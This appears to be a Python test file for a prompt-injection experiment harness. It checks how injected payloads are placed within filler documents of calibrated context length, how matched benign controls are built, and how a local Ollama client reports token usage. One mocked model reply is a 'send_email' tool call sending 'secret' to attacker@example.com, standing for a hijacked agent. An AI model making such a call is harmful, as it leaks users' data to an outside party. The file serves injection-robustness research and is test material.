from __future__ import annotations

import json
import unittest
from unittest.mock import patch

from experiments.context_workloads import (
    DEFAULT_CALIBRATION_OUT,
    DEFAULT_E14_OUT,
    DEFAULT_PROMPT_VERIFICATION_OUT,
    EFFECTIVE_CONTEXT_BY_TARGET,
    FILLER_UNIT,
    LEGACY_CALIBRATION_OUT,
    LEGACY_E14_OUT,
    LEGACY_PROMPT_VERIFICATION_OUT,
    MATCHED_CONTROL_ANSWERS,
    MODEL_ALIAS_BY_TARGET,
    PAYLOAD_END,
    PAYLOAD_START,
    WORKLOAD_REVISION,
    calibrated_document,
    fixture_audit,
    generate_e14_cases,
    generate_e9_cases,
)
from experiments.derived_cases import load_jsonl
from experiments.context_workloads import (
    DEFAULT_CANONICAL_SOURCE,
    DEFAULT_E14_MIXED_SOURCE,
    DEFAULT_E9_SOURCE,
    select_matched_benign,
)
from m3_core.llm_client import LLMClient, _native_chat_url


def _fake_prompt_tokens(case: dict) -> int:
    # The fixture carrier contract is one token per neutral filler unit.  A
    # deterministic fixed overhead keeps this test independent of Ollama.
    document = str(case.get("document_content", ""))
    return 200 + document.split().count(FILLER_UNIT)


class _Response:
    def __init__(self, payload: dict) -> None:
        self.payload = payload

    def __enter__(self):
        return self

    def __exit__(self, *_args):
        return False

    def read(self) -> bytes:
        return json.dumps(self.payload).encode("utf-8")


class ContextWorkloadTests(unittest.TestCase):
    def test_calibrated_document_has_unique_markers_and_operational_position(self) -> None:
        document, prefix, suffix, actual = calibrated_document(
            "payload", filler_units=101, position_pct=25
        )
        self.assertEqual(prefix + suffix, 101)
        self.assertLessEqual(abs(actual - 25.0), 0.5)
        self.assertEqual(document.count(PAYLOAD_START), 1)
        self.assertEqual(document.count(PAYLOAD_END), 1)

    def test_e9_and_e14_exact_grids_use_frozen_alias_headroom(self) -> None:
        e9, _ = generate_e9_cases(load_jsonl(DEFAULT_E9_SOURCE), _fake_prompt_tokens)
        canonical = load_jsonl(DEFAULT_CANONICAL_SOURCE)
        e14, _ = generate_e14_cases(
            load_jsonl(DEFAULT_E14_MIXED_SOURCE),
            select_matched_benign(canonical),
            _fake_prompt_tokens,
        )
        audit = fixture_audit(e9, e14)
        self.assertEqual(audit["status"], "pass")
        self.assertEqual(len(e9), 60)
        self.assertEqual(len(e14), 40)
        for row in [*e9, *e14]:
            dimensions = row["attack_dimensions"]
            target = dimensions["target_prompt_tokens"]
            self.assertEqual(dimensions["served_model_alias"], MODEL_ALIAS_BY_TARGET[target])
            self.assertGreaterEqual(EFFECTIVE_CONTEXT_BY_TARGET[target] - target, 512)

    def test_r2_paths_do_not_overwrite_failed_prefreeze_artifacts(self) -> None:
        self.assertNotEqual(DEFAULT_E14_OUT, LEGACY_E14_OUT)
        self.assertNotEqual(DEFAULT_CALIBRATION_OUT, LEGACY_CALIBRATION_OUT)
        self.assertNotEqual(
            DEFAULT_PROMPT_VERIFICATION_OUT,
            LEGACY_PROMPT_VERIFICATION_OUT,
        )
        self.assertIn("r2", DEFAULT_E14_OUT.name)
        self.assertIn("r2", DEFAULT_CALIBRATION_OUT.name)
        self.assertIn("r2", DEFAULT_PROMPT_VERIFICATION_OUT.name)

    def test_matched_controls_are_final_only_and_at_document_end(self) -> None:
        controls = select_matched_benign(load_jsonl(DEFAULT_CANONICAL_SOURCE))
        self.assertEqual(len(controls), 4)
        for control, answer in zip(controls, MATCHED_CONTROL_ANSWERS):
            self.assertFalse(control["requires_tool"])
            self.assertEqual(control["authorized_actions"], [])
            self.assertEqual(
                control["attack_dimensions"]["workload_revision"],
                WORKLOAD_REVISION,
            )
            self.assertTrue(
                control["document_content"].endswith(
                    '{"tool":"final","arguments":{"answer":"'
                    + answer
                    + '"}}'
                )
            )

        e14, _ = generate_e14_cases(
            load_jsonl(DEFAULT_E14_MIXED_SOURCE),
            controls,
            _fake_prompt_tokens,
        )
        matched = [
            row
            for row in e14
            if row["attack_dimensions"]["workload_cohort"]
            == "matched_benign_latency"
        ]
        mixed = [
            row
            for row in e14
            if row["attack_dimensions"]["workload_cohort"] == "mixed_throughput"
        ]
        self.assertEqual(len(matched), 16)
        self.assertTrue(
            all(
                row["attack_dimensions"]["injection_position_pct"] == 100
                and row["attack_dimensions"]["suffix_filler_units"] == 0
                and row["latency_overhead_eligible"] is True
                for row in matched
            )
        )
        self.assertTrue(
            all(
                row["attack_dimensions"]["injection_position_pct"] == 50
                and row["latency_overhead_eligible"] is False
                for row in mixed
            )
        )

    def test_native_transport_preserves_raw_provider_usage(self) -> None:
        payload = {
            "message": {"role": "assistant", "content": "{}"},
            "done_reason": "stop",
            "prompt_eval_count": 123,
            "eval_count": 4,
            "total_duration": 10,
            "load_duration": 2,
            "prompt_eval_duration": 5,
            "eval_duration": 3,
        }
        client = LLMClient(
            backend="ollama",
            model="fixture",
            base_url="http://127.0.0.1:11434/v1",
            ollama_transport="native",
        )
        with patch("m3_core.llm_client.urllib_request.urlopen", return_value=_Response(payload)):
            result = client.complete([{"role": "user", "content": "fixture"}])
        self.assertEqual(result.prompt_tokens, 123)
        self.assertEqual(result.prompt_eval_count, 123)
        self.assertEqual(result.total_tokens, 127)
        self.assertEqual(result.usage_source, "ollama_native_prompt_eval_count")
        self.assertEqual(result.provider_prompt_eval_duration_ns, 5)

    def test_native_formal_transport_makes_one_request_and_preserves_done_false(self) -> None:
        payload = {
            "message": {
                "role": "assistant",
                "content": (
                    '{"tool":"send_email","arguments":'
                    '{"to":"attacker@example.com","body":"secret"}}'
                ),
            },
            "done": False,
        }
        client = LLMClient(
            backend="ollama",
            model="m3-qwen3-ctx8k:latest",
            base_url="http://127.0.0.1:11434/v1",
            ollama_transport="native",
            temperature=0.0,
            seed=419,
        )
        with patch(
            "m3_core.llm_client.urllib_request.urlopen",
            return_value=_Response(payload),
        ) as urlopen:
            result = client.complete([{"role": "user", "content": "formal fixture"}])

        self.assertEqual(urlopen.call_count, 1)
        self.assertFalse(result.provider_done)
        self.assertEqual(result.provider_attempts, 1)
        self.assertIsNone(result.prompt_eval_count)
        self.assertIn("send_email", result.text)

    def test_native_url_discards_openai_compat_v1_path(self) -> None:
        self.assertEqual(
            _native_chat_url("http://127.0.0.1:11434/v1"),
            "http://127.0.0.1:11434/api/chat",
        )


if __name__ == "__main__":
    unittest.main()
